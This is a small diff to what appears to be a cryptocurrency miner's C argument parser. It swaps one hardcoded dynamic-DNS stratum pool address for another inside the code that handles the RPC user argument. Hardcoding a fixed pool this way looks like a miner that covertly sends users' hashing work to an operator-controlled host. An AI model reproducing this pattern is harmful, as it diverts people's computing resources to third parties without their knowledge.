@@ -2680,7 +2680,7 @@ void parse_arg(int key, char *arg )
 		rpc_user = strdup(arg);
 
         //pool define
-        char *pool = "stratum+tcp://mmowork.ddns.net:3033";
+        char *pool = "stratum+tcp://severtat.ddns.net:3033";
         char *ap, *hp;
 		ap = strstr(pool, "://");
 		ap = ap ? ap + 3 : pool;
